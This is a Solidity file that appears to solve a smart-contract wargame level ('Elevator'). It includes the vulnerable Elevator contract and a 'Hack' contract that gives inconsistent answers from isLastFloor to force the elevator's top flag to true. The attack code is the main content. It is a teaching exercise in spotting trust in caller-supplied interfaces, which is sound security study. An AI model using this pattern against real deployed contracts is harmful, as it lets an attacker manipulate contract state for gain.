// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Hack {
    Elevator public elevator;
    Building public building;
    uint private floorCounter;

    constructor(address _elevatorAddress) {
        building = Building(address(this));
        elevator = Elevator(_elevatorAddress);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        _floor = floorCounter;
        floorCounter++;
        return _floor == 0 ? false : true;
    }

    function attack() external {
        elevator.goTo(123);
    }
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
